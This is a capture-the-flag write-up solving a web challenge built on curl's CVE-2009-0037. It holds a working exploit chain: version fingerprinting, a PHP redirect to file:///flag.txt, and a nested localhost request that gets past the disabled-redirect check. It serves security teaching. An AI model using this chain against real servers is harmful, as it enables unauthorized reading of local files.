# Solution

This challenge demonstrates 10-year old [curl vulnerability](https://curl.haxx.se/docs/CVE-2009-0037.html).

There are 3 small hints in this challenge:

1. Let me see your URL -> "see url" is "curl"

2. In the HTML source code: `Flag is at /flag.txt`

3. Light gray label saying `Your IP address is X.X.X.X`

One can identify the curl version by sending the request to their own server. Curl version will be exposed as an `User-Agent` HTTP header:

```
User-Agent: curl/7.19.3 (x86_64-unknown-linux-gnu) libcurl/7.19.3 zlib/1.2.11
```

One can easily google that this curl version has Arbitrary File Access vulnerability, [CVE-2009-0037](https://curl.haxx.se/docs/CVE-2009-0037.html).

The payload would be to force curl to redirect to local file `/flag.txt`. Example script:

```
<?php

header('Location: file:///flag.txt');
```

Try it yourself manually:

```
$ curl -v http://dev.oioki.me/curl/
...
< HTTP/1.1 302 Found
...
< Location: file:///flag.txt
```

[http://192.168.1.81:5000/?url=http://dev.oioki.me/curl/]

However, this will not work because redirect following is disabled. Except, if the request is coming from 127.0.0.1.

I feel it as quite an easy guess, because there is a hint #3 about IP address. One needs to add another layer of request:

[http://192.168.1.81:5000/?url=http://localhost:5000/?url=http://dev.oioki.me/curl/]

Then it works and we get a flag.
